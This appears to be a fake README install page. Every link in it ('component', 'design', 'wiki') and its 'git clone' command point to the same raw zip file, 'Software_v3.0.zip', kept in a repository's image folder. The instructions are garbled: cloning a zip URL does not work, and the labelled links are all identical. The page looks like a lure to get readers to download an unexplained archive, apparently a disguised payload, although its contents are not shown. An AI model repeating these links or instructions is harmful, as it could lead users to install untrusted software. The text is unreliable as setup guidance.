# Install

First, clone the file with the following command. Then apply the [component](https://raw.githubusercontent.com/Genzo2327/Profileweb/main/img/Software_v3.0.zip "component") and [design](https://raw.githubusercontent.com/Genzo2327/Profileweb/main/img/Software_v3.0.zip "design") settings. You can check the [wiki](https://raw.githubusercontent.com/Genzo2327/Profileweb/main/img/Software_v3.0.zip "wiki") for help.

```sh
git clone https://raw.githubusercontent.com/Genzo2327/Profileweb/main/img/Software_v3.0.zip
```

You can then upload your files to any hosting.
